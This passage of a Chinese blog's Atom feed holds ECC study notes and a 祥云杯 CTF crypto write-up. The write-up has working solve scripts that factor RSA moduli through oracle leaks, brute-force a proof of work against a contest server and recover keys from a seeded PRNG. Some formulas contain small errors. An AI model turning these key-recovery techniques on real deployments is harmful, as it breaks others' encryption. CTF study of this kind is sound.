    <category term="Crypto" scheme="http://sh1k4ku.github.io/categories/Crypto/"/>
    
    
    <category term="离散对数" scheme="http://sh1k4ku.github.io/tags/%E7%A6%BB%E6%95%A3%E5%AF%B9%E6%95%B0/"/>
    
  </entry>
  
  <entry>
    <title>ECC</title>
    <link href="http://sh1k4ku.github.io/2021/08/30/2021/ECC/"/>
    <id>http://sh1k4ku.github.io/2021/08/30/2021/ECC/</id>
    <published>2021-08-30T08:14:06.000Z</published>
    <updated>2021-08-30T15:56:59.318Z</updated>
    
    <content type="html"><![CDATA[<p>抄点ECC笔记</p><span id="more"></span><h1 id="ECC"><a href="#ECC" class="headerlink" title="ECC"></a>ECC</h1><p>定义：ECC 全称为椭圆曲线加密，EllipseCurve Cryptography，是一种基于椭圆曲线数学的公钥密码。与传统的基于大质数因子分解困难性的加密方法不同，ECC 依赖于解决椭圆曲线离散对数问题的困难性。它的优势主要在于相对于其它方法，它可以在使用较短密钥长度的同时保持相同的密码强度。目前椭圆曲线主要采用的有限域有:</p><ol><li>以素数为模的整数域 GF(p)，通常在通用处理器上更为有效。</li><li>特征为 2 的伽罗华域 GF（2^m），可以设计专门的硬件。</li></ol><p>（from CTF Wiki）</p><h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><p>定义式：<script type="math/tex">y^2+axy+by=x^3+cx^2+dx+e</script>，其中的所有系数都是在某个有限域GF(p)中的元素，p是一个大素数；</p><p>最常用的方程为：<script type="math/tex">y^2=x^3+ax+b</script>，需要满足条件<script type="math/tex">4a^3+27b^2\;mod\; p \neq 0</script></p><p>该定义要求曲线是非奇异的，意味着曲线不会自我相交或没有顶点。</p><h2 id="群操作"><a href="#群操作" class="headerlink" title="群操作"></a>群操作</h2><p>假设用加法符号“+”表示它的群操作，事实上，E(Fp)对于运算+构成一个阿贝尔群（交换群，满足逆元存在，封闭性等），存在无穷远点O</p><h3 id="逆元"><a href="#逆元" class="headerlink" title="逆元"></a>逆元</h3><p>定义群元素P的逆元-P，则P+(-P)=O</p><script type="math/tex; mode=display">若P=(x_p,y_p)\;\;\;则-P=(x_p,p-y_p)</script><h3 id="数乘"><a href="#数乘" class="headerlink" title="数乘"></a>数乘</h3><script type="math/tex; mode=display">定义Q=kP，可以看作k个P相加得到Q    \\若O=tP,则称P的阶是t</script><h3 id="相异点相加"><a href="#相异点相加" class="headerlink" title="相异点相加"></a>相异点相加</h3><script type="math/tex; mode=display">P(x_1,y_1),Q(x_2,y_2),R(x_3,y_3)\;\;P+Q=R</script><p><img src="/images/ECC/1.png" alt></p><script type="math/tex; mode=display">x_3=(\frac{y_2-y_1}{x_2-x_1})^2-x_1-x_2\;mod\;p\\y_3=\frac{y_2-y_1}{x_2-x_1}(x_1-x_3)-y_1\;mod\;p</script><h3 id="相同点相加"><a href="#相同点相加" class="headerlink" title="相同点相加"></a>相同点相加</h3><p><img src="/images/ECC/2.png" alt></p><script type="math/tex; mode=display">x_3=(\frac{3x_1^2+a}{2y_1})^2-x_1-x_2\;mod\;p\\y_3=\frac{3x_1^2+a}{2y_1}(x_1-x_3)-y_1\;mod\;p</script><h2 id="加解密"><a href="#加解密" class="headerlink" title="加解密"></a>加解密</h2><h3 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h3><p>B向A发送m，其中m已经被编码为椭圆曲线上的点：</p><ol><li>查询A的公钥<script type="math/tex">E_q(a,b),q,P,G，其中P=kG。k为私钥</script>。</li><li>在<script type="math/tex">（1，n）</script>内选择随机数r（其中n为G的阶数）。</li><li>根据A的公钥计算<script type="math/tex">(x_1,y_1)=rG</script>。</li><li>计算<script type="math/tex">(x_2,y_2)=kP</script>。如果为O，则从第二步重新开始。</li><li>计算<script type="math/tex">C=m+(x_2,y_2)</script>。</li><li>将<script type="math/tex">(x_1,y_1)和C</script>发送给A</li></ol><h3 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h3><script type="math/tex; mode=display">m=C-(x_2,y_2)=C-kP=C-rkG=C-k(x_1,y_1)</script>]]></content>
    
    
    <summary type="html">&lt;p&gt;抄点ECC笔记&lt;/p&gt;</summary>
    
    
    
    <category term="Crypto" scheme="http://sh1k4ku.github.io/categories/Crypto/"/>
    
    
    <category term="ECC" scheme="http://sh1k4ku.github.io/tags/ECC/"/>
    
  </entry>
  
  <entry>
    <title>祥云杯</title>
    <link href="http://sh1k4ku.github.io/2021/08/21/2021/%E7%A5%A5%E4%BA%91%E6%9D%AF/"/>
    <id>http://sh1k4ku.github.io/2021/08/21/2021/%E7%A5%A5%E4%BA%91%E6%9D%AF/</id>
    <published>2021-08-21T04:19:38.000Z</published>
    <updated>2021-08-30T08:18:37.891Z</updated>
    
    <content type="html"><![CDATA[<p>还要再加油。</p><span id="more"></span><h1 id="Guess"><a href="#Guess" class="headerlink" title="Guess"></a>Guess</h1><p>这一题是个Paillier加密方案，加解密函数都给出了</p><script type="math/tex; mode=display">c=g^mr^n\;mod\;n^2</script><h2 id="同态"><a href="#同态" class="headerlink" title="同态"></a>同态</h2><p>Paillier加密具有<strong>同态</strong>的性质，满足:<script type="math/tex">D(c_1c_2)=m_1+m_2</script>，proof：</p><script type="math/tex; mode=display">c_1=g^{m_1}r1^n\;mod \;n\\c_2=g^{m_1}r2^n\;mod \;n\\∴c_1c_2=g^{m_1m_2}(r_1r_2)^n\;mod\;n\\即c=c_1c_2,m=m_1+m_2</script><p>所以<script type="math/tex">D(c^2)=2m</script></p><h2 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h2><ol><li>给出公钥n、g；</li><li>传入一个ciphertext，给出相应的plaintext；</li><li><script type="math/tex">传入m_1和m_2，均大于2且比特位相同，随机返回E(m_1m_2KEY_R) or E(m_1m_2KEY_{R+1})</script>；</li><li>再传入一个ciphertext，给出相应的plaintext；</li><li>猜测步骤3返回的是密文所对应的明文是哪一个；</li><li>循环上述步骤32轮；</li></ol><h2 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h2><p>传入<script type="math/tex">m_1和m_2</script>后拿到的密文记为c。在步骤5中传入<script type="math/tex">c^2</script>，则可获得加密明文的两倍。那么现在要解决的问题是key，这个利用LLL和BKZ算法能爆出来。</p><h1 id="myRSA"><a href="#myRSA" class="headerlink" title="myRSA"></a>myRSA</h1><p>加密的关键代码:</p><script type="math/tex; mode=display">x=p^2(p+3q-1)+q^2(q+3p-1)\\y=2pq+p+q\\z\\c=m^e\; mod\;n\\∴xc+yc+z=[(p+q)^3-(p-q)^2+(p+q)]c+z\\∵ n=pq\\∴上式=[(p+q)^3-(p+q)^2+(p+q)+4n]c+z\\令p+q=a\\∴cc=(a^3-a^2+a+4n)c+z</script><p>然后就拿到了一个线性方程，其中c的系数是1500+位的，z是1040位数，c可以自己构造，这里为了让c尽可能大所以选择m1=n-1。</p><p>现在要做的是分解n，所以两边同除c，那么右边剩下1500位+16位，测试后发现<script type="math/tex">\sqrt{x+y}{3}=p+q-1</script>，那么就得到了p+q的值，再利用<script type="math/tex">p-q=\sqrt{(p+q)^2-4n}{2}</script>就可以分解pq了。</p><p>最后<script type="math/tex">ccc=(x+y)flag^e+z</script>因为x+y的位数大于z，所以两边整除x+y即可获得flag加密后的值，最后解出flag。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pathlib</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> gmtime</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dehash</span>(<span class="params">s,re</span>):</span></span><br><span class="line">    alphabet = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890abcdefghijklmnopqrstuvwxyz&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(s,re)</span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> alphabet:</span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> alphabet:</span><br><span class="line">            <span class="keyword">for</span> c <span class="keyword">in</span> alphabet:</span><br><span class="line">                <span class="keyword">for</span> d <span class="keyword">in</span> alphabet:</span><br><span class="line">                    ss=a+b+c+d+s</span><br><span class="line">                    <span class="keyword">if</span>  sha256(ss.encode()).hexdigest()==re:</span><br><span class="line">                        <span class="keyword">return</span> a+b+c+d</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getpq</span>(<span class="params">c,n</span>):</span></span><br><span class="line">    c1=gmpy2.iroot(c,<span class="number">3</span>)[<span class="number">0</span>]+<span class="number">1</span><span class="comment">#c1=p+q</span></span><br><span class="line">    c2=gmpy2.iroot(c1**<span class="number">2</span>-<span class="number">4</span>*n,<span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">return</span> (c1+c2)//<span class="number">2</span>,(c1-c2)//<span class="number">2</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line">    p=remote(<span class="string">&#x27;47.104.85.225&#x27;</span>,<span class="number">49877</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;SHA-256(?+&quot;</span>)</span><br><span class="line">    s=p.recvuntil(<span class="string">&quot;) == &quot;</span>, drop=<span class="literal">True</span>)</span><br><span class="line">    hashre=p.recvline()[:-<span class="number">1</span>]</span><br><span class="line">    p.sendline(dehash(s.decode(),hashre.decode()))</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;n = &#x27;</span>)</span><br><span class="line">    n=<span class="built_in">int</span>(p.recvline()[:-<span class="number">1</span>])</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;e = &#x27;</span>)</span><br><span class="line">    e=<span class="built_in">int</span>(p.recvline()[:-<span class="number">1</span>])</span><br><span class="line">    p.recvline()</span><br><span class="line">    p.recvline()</span><br><span class="line">    p.recvline()</span><br><span class="line">    p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvline()</span><br><span class="line">    message=n-<span class="number">1</span></span><br><span class="line">    p.sendline(long_to_bytes(message))</span><br><span class="line">    p.recvline()</span><br><span class="line">    cc=<span class="built_in">int</span>(p.recvline()[:-<span class="number">1</span>].decode())</span><br><span class="line">    p0,q0=getpq(cc//message,n)</span><br><span class="line">    <span class="keyword">assert</span> p0*q0==n</span><br><span class="line">    p.recvline()</span><br><span class="line">    p.recvline()</span><br><span class="line">    p.recvline()</span><br><span class="line">    p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.recvline()</span><br><span class="line">    p.recvline()</span><br><span class="line">    ccc=p.recvline()[:-<span class="number">1</span>].decode()</span><br><span class="line">    ccc=<span class="built_in">int</span>(ccc)</span><br><span class="line">    </span><br><span class="line">    x=p0**<span class="number">2</span> * (p0 + <span class="number">3</span>*q0 - <span class="number">1</span> ) + q0**<span class="number">2</span> * (q0 + <span class="number">3</span>*p0 - <span class="number">1</span>) </span><br><span class="line">    y=<span class="number">2</span>*p0*q0 + p0 + q0</span><br><span class="line">    flag=ccc//(x+y)</span><br><span class="line">    phi=(p0-<span class="number">1</span>)*(q0-<span class="number">1</span>)</span><br><span class="line">    d=gmpy2.invert(e,phi)</span><br><span class="line">    <span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(flag,d,n)))</span><br><span class="line">main()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="Random-RSA"><a href="#Random-RSA" class="headerlink" title="Random_RSA"></a>Random_RSA</h1><p>题目分成两部分，前半部分是RSA的dp、c、n模式，后半部分是生成种子后生成伪随机数，再通过Feistal网络加密dp。</p><p>这一题要使用py2来解伪随机数，获取dp后在(1,e)爆破i满足<script type="math/tex">(dp⋅e−1)%i==0(dp⋅e−1)%i==0和n%((dp⋅e−1)//i+1)==0时n%((dp⋅e−1)//i+1)==0时</script>，N成功分解，证明在大佬的博客里有。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long, long_to_bytes</span><br><span class="line"><span class="keyword">from</span> pwnlib <span class="keyword">import</span> encoders</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">e, dp, n</span>):</span></span><br><span class="line">    _ = dp * e - <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, e):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> _ % i:</span><br><span class="line">            p = _ // i + <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> n % p:</span><br><span class="line">                q = n // p</span><br><span class="line">                phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">                d = <span class="built_in">int</span>(gmpy2.invert(e, phi))</span><br><span class="line">                <span class="keyword">return</span> d</span><br><span class="line"></span><br><span class="line">n=<span class="number">81196282992606113591233615204680597645208562279327854026981376917977843644855180528227037752692498558370026353244981467900057157997462760732019372185955846507977456657760125682125104309241802108853618468491463326268016450119817181368743376919334016359137566652069490881871670703767378496685419790016705210391</span></span><br><span class="line">ct=<span class="number">61505256223993349534474550877787675500827332878941621261477860880689799960938202020614342208518869582019307850789493701589309453566095881294166336673487909221860641809622524813959284722285069755310890972255545436989082654705098907006694780949725756312169019688455553997031840488852954588581160550377081811151</span></span><br><span class="line">e=<span class="number">0x10001</span></span><br><span class="line">seeds=[<span class="number">4827</span>, <span class="number">9522</span>, <span class="number">552</span>, <span class="number">880</span>, <span class="number">7467</span>, <span class="number">7742</span>, <span class="number">9425</span>, <span class="number">4803</span>, <span class="number">6146</span>, <span class="number">4366</span>, <span class="number">1126</span>, <span class="number">4707</span>, <span class="number">1138</span>, <span class="number">2367</span>, <span class="number">1081</span>, <span class="number">5577</span>, <span class="number">4592</span>, <span class="number">5897</span>, <span class="number">4565</span>, <span class="number">2012</span>, <span class="number">2700</span>, <span class="number">1331</span>, <span class="number">9638</span>, <span class="number">7741</span>, <span class="number">50</span>, <span class="number">824</span>, <span class="number">8321</span>, <span class="number">7411</span>, <span class="number">6145</span>, <span class="number">1271</span>, <span class="number">7637</span>, <span class="number">5481</span>, <span class="number">8474</span>, <span class="number">2085</span>, <span class="number">2421</span>, <span class="number">590</span>, <span class="number">7733</span>, <span class="number">9427</span>, <span class="number">3278</span>, <span class="number">5361</span>, <span class="number">1284</span>, <span class="number">2280</span>, <span class="number">7001</span>, <span class="number">8573</span>, <span class="number">5494</span>, <span class="number">7431</span>, <span class="number">2765</span>, <span class="number">827</span>, <span class="number">102</span>, <span class="number">1419</span>, <span class="number">6528</span>, <span class="number">735</span>, <span class="number">5653</span>, <span class="number">109</span>, <span class="number">4158</span>, <span class="number">5877</span>, <span class="number">5975</span>, <span class="number">1527</span>, <span class="number">3027</span>, <span class="number">9776</span>, <span class="number">5263</span>, <span class="number">5211</span>, <span class="number">1293</span>, <span class="number">5976</span>, <span class="number">7759</span>, <span class="number">3268</span>, <span class="number">1893</span>, <span class="number">6546</span>, <span class="number">4684</span>, <span class="number">419</span>, <span class="number">8334</span>, <span class="number">7621</span>, <span class="number">1649</span>, <span class="number">6840</span>, <span class="number">2975</span>, <span class="number">8605</span>, <span class="number">5714</span>, <span class="number">2709</span>, <span class="number">1109</span>, <span class="number">358</span>, <span class="number">2858</span>, <span class="number">6868</span>, <span class="number">2442</span>, <span class="number">8431</span>, <span class="number">8316</span>, <span class="number">5446</span>, <span class="number">9356</span>, <span class="number">2817</span>, <span class="number">2941</span>, <span class="number">3177</span>, <span class="number">7388</span>, <span class="number">4149</span>, <span class="number">4634</span>, <span class="number">4316</span>, <span class="number">5377</span>, <span class="number">4327</span>, <span class="number">1774</span>, <span class="number">6613</span>, <span class="number">5728</span>, <span class="number">1751</span>, <span class="number">8478</span>, <span class="number">3132</span>, <span class="number">4680</span>, <span class="number">3308</span>, <span class="number">9769</span>, <span class="number">8341</span>, <span class="number">1627</span>, <span class="number">3501</span>, <span class="number">1046</span>, <span class="number">2609</span>, <span class="number">7190</span>, <span class="number">5706</span>, <span class="number">3627</span>, <span class="number">8867</span>, <span class="number">2458</span>, <span class="number">607</span>, <span class="number">642</span>, <span class="number">5436</span>, <span class="number">6355</span>, <span class="number">6326</span>, <span class="number">1481</span>, <span class="number">9887</span>, <span class="number">205</span>, <span class="number">5511</span>, <span class="number">537</span>, <span class="number">8576</span>, <span class="number">6376</span>, <span class="number">3619</span>, <span class="number">6609</span>, <span class="number">8473</span>, <span class="number">2139</span>, <span class="number">3889</span>, <span class="number">1309</span>, <span class="number">9878</span>, <span class="number">2182</span>, <span class="number">8572</span>, <span class="number">9275</span>, <span class="number">5235</span>, <span class="number">6989</span>, <span class="number">6592</span>, <span class="number">4618</span>, <span class="number">7883</span>, <span class="number">5702</span>, <span class="number">3999</span>, <span class="number">925</span>, <span class="number">2419</span>, <span class="number">7838</span>, <span class="number">3073</span>, <span class="number">488</span>, <span class="number">21</span>, <span class="number">3280</span>, <span class="number">9915</span>, <span class="number">3672</span>, <span class="number">579</span>]</span><br><span class="line"></span><br><span class="line">res=[<span class="number">55</span>,<span class="number">5</span>,<span class="number">183</span>,<span class="number">192</span>,<span class="number">103</span>, <span class="number">32</span>, <span class="number">211</span>, <span class="number">116</span>, <span class="number">102</span>, <span class="number">120</span>, <span class="number">118</span>, <span class="number">54</span>, <span class="number">120</span>, <span class="number">145</span>, <span class="number">185</span>, <span class="number">254</span>, <span class="number">77</span>, <span class="number">144</span>, <span class="number">70</span>, <span class="number">54</span>, <span class="number">193</span>, <span class="number">73</span>, <span class="number">64</span>, <span class="number">0</span>, <span class="number">79</span>, <span class="number">244</span>, <span class="number">190</span>, <span class="number">23</span>, <span class="number">215</span>, <span class="number">187</span>, <span class="number">53</span>, <span class="number">176</span>, <span class="number">27</span>, <span class="number">138</span>, <span class="number">42</span>, <span class="number">89</span>, <span class="number">158</span>, <span class="number">254</span>, <span class="number">159</span>, <span class="number">133</span>, <span class="number">78</span>, <span class="number">11</span>, <span class="number">155</span>, <span class="number">163</span>, <span class="number">145</span>, <span class="number">248</span>, <span class="number">14</span>, <span class="number">179</span>, <span class="number">23</span>, <span class="number">226</span>, <span class="number">220</span>, <span class="number">201</span>, <span class="number">5</span>, <span class="number">71</span>, <span class="number">241</span>, <span class="number">195</span>, <span class="number">75</span>, <span class="number">191</span>, <span class="number">237</span>, <span class="number">108</span>, <span class="number">141</span>, <span class="number">141</span>, <span class="number">185</span>, <span class="number">76</span>, <span class="number">7</span>, <span class="number">113</span>, <span class="number">191</span>, <span class="number">48</span>, <span class="number">135</span>, <span class="number">139</span>, <span class="number">100</span>, <span class="number">83</span>, <span class="number">212</span>, <span class="number">242</span>, <span class="number">21</span>, <span class="number">143</span>, <span class="number">255</span>, <span class="number">164</span>, <span class="number">146</span>, <span class="number">119</span>, <span class="number">173</span>, <span class="number">255</span>, <span class="number">140</span>, <span class="number">193</span>, <span class="number">173</span>, <span class="number">2</span>, <span class="number">224</span>, <span class="number">205</span>, <span class="number">68</span>, <span class="number">10</span>, <span class="number">77</span>, <span class="number">180</span>, <span class="number">24</span>, <span class="number">23</span>, <span class="number">196</span>, <span class="number">205</span>, <span class="number">108</span>, <span class="number">28</span>, <span class="number">243</span>, <span class="number">80</span>, <span class="number">140</span>, <span class="number">4</span>, <span class="number">98</span>, <span class="number">76</span>, <span class="number">217</span>, <span class="number">70</span>, <span class="number">208</span>, <span class="number">202</span>, <span class="number">78</span>, <span class="number">177</span>, <span class="number">124</span>, <span class="number">10</span>, <span class="number">168</span>, <span class="number">165</span>, <span class="number">223</span>, <span class="number">105</span>, <span class="number">157</span>, <span class="number">152</span>, <span class="number">48</span>, <span class="number">152</span>, <span class="number">51</span>, <span class="number">133</span>, <span class="number">190</span>, <span class="number">202</span>, <span class="number">136</span>, <span class="number">204</span>, <span class="number">44</span>, <span class="number">33</span>, <span class="number">58</span>, <span class="number">4</span>, <span class="number">196</span>, <span class="number">219</span>, <span class="number">71</span>, <span class="number">150</span>, <span class="number">68</span>, <span class="number">162</span>, <span class="number">175</span>, <span class="number">218</span>, <span class="number">173</span>, <span class="number">19</span>, <span class="number">201</span>, <span class="number">100</span>, <span class="number">100</span>, <span class="number">85</span>, <span class="number">201</span>, <span class="number">24</span>, <span class="number">59</span>, <span class="number">186</span>, <span class="number">46</span>, <span class="number">130</span>, <span class="number">147</span>, <span class="number">219</span>, <span class="number">22</span>, <span class="number">81</span>]</span><br><span class="line">dp=<span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#rands=[[2, 58, 53, 122], [145, 54, 124, 244], [5, 19, 128, 192], [255, 23, 64, 242], [87, 57, 113, 194], [246, 16, 205, 162], [112, 87, 228, 95], [215, 147, 105, 64], [84, 16, 131, 38], [234, 78, 36, 46], [68, 61, 71, 146], [148, 61, 9, 0], [73, 139, 77, 32], [96, 160, 56, 160], [121, 76, 128, 17], [114, 246, 92, 200], [124, 178, 206, 60], [168, 165, 147, 26], [168, 41, 114, 68], [24, 93, 84, 2], [241, 175, 43, 88], [147, 124, 97, 153], [42, 94, 118, 45], [150, 103, 127, 52], [127, 68, 163, 62], [165, 193, 37, 89], [219, 248, 142, 59], [241, 182, 8, 35], [230, 140, 211, 146], [88, 138, 226, 2], [48, 150, 5, 56], [87, 109, 255, 135], [40, 227, 216, 65], [23, 188, 190, 10], [5, 25, 28, 64], [6, 12, 124, 108], [167, 53, 113, 124], [255, 207, 192, 158], [61, 239, 166, 5], [62, 108, 86, 181], [127, 123, 44, 64], [195, 51, 192, 30], [30, 82, 168, 95], [56, 178, 165, 146], [168, 68, 77, 239], [106, 204, 247, 226], [17, 46, 62, 114], [91, 71, 156, 134], [37, 157, 43, 182], [146, 219, 6, 42], [148, 143, 234, 161], [108, 33, 139, 255], [50, 139, 169, 157], [71, 117, 140, 25], [28, 153, 194, 26], [241, 221, 235, 243], [124, 28, 131, 141], [159, 137, 111, 184], [47, 206, 221, 11], [220, 152, 157, 88], [188, 41, 213, 97], [4, 191, 220, 10], [77, 13, 143, 248], [94, 140, 110, 122], [49, 25, 250, 226], [218, 64, 102, 109], [189, 238, 143, 66], [91, 18, 131, 8], [190, 23, 239, 190], [159, 184, 33, 72], [183, 78, 85, 208], [209, 213, 101, 102], [236, 111, 50, 220], [166, 196, 104, 233], [170, 144, 34, 10], [187, 87, 175, 183], [207, 195, 59, 104], [165, 157, 179, 179], [99, 247, 160, 153], [195, 61, 100, 79], [153, 223, 159, 165], [230, 202, 93, 184], [87, 28, 184, 35], [35, 122, 38, 244], [157, 158, 188, 163], [229, 48, 192, 222], [12, 12, 211, 192], [207, 95, 224, 255], [113, 127, 113, 137], [22, 58, 114, 143], [13, 45, 117, 144], [70, 140, 211, 131], [33, 57, 101, 42], [132, 36, 62, 129], [40, 128, 246, 124], [1, 132, 161, 250], [85, 164, 33, 133], [252, 41, 201, 32], [8, 18, 203, 247], [1, 88, 55, 101], [189, 201, 135, 186], [101, 50, 254, 125], [236, 196, 81, 39], [148, 24, 103, 127], [233, 101, 29, 253], [97, 114, 156, 64], [90, 103, 233, 91], [50, 48, 80, 251], [118, 206, 22, 93], [11, 137, 114, 174], [61, 132, 76, 247], [215, 32, 232, 61], [158, 95, 128, 90], [57, 144, 35, 228], [163, 143, 233, 107], [178, 250, 28, 80], [169, 64, 107, 225], [106, 174, 115, 207], [85, 134, 1, 21], [118, 201, 76, 172], [4, 234, 34, 22], [241, 176, 236, 122], [111, 185, 137, 127], [1, 26, 164, 255], [186, 254, 57, 117], [243, 244, 27, 32], [161, 88, 28, 80], [50, 165, 93, 17], [12, 87, 182, 216], [184, 55, 159, 63], [167, 166, 246, 123], [37, 78, 33, 235], [127, 186, 81, 58], [48, 167, 3, 239], [70, 186, 114, 13], [56, 108, 178, 154], [151, 54, 55, 235], [105, 235, 180, 105], [16, 194, 155, 98], [136, 11, 41, 39], [252, 18, 203, 79], [185, 83, 114, 170], [148, 181, 87, 223], [118, 57, 160, 97], [255, 23, 250, 181], [235, 47, 219, 228], [106, 253, 14, 44], [44, 151, 38, 143], [28, 185, 224, 134], [42, 176, 162, 122], [3, 9, 164, 158], [129, 245, 2, 235], [35, 66, 241, 92], [80, 102, 124, 36]]</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(res)):</span><br><span class="line">    random.seed(seeds[i])</span><br><span class="line">    rand=[]</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        rand.append(random.randint)</span><br><span class="line">    dp+=<span class="built_in">chr</span>(res[i]^rand[i%<span class="number">4</span>]).encode()</span><br><span class="line">dp=<span class="built_in">int</span>(dp)</span><br><span class="line">d=decrypt(e,dp,n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(ct,d,n)))</span><br></pre></td></tr></table></figure><h1 id="share-secret"><a href="#share-secret" class="headerlink" title="share secret"></a>share secret</h1><p>…</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;还要再加油。&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://sh1k4ku.github.io/categories/CTF/"/>
    
    
    <category term="RSA" scheme="http://sh1k4ku.github.io/tags/RSA/"/>
    
    <category term="random" scheme="http://sh1k4ku.github.io/tags/random/"/>
    
    <category term="paillier" scheme="http://sh1k4ku.github.io/tags/paillier/"/>
    
  </entry>
  
</feed>
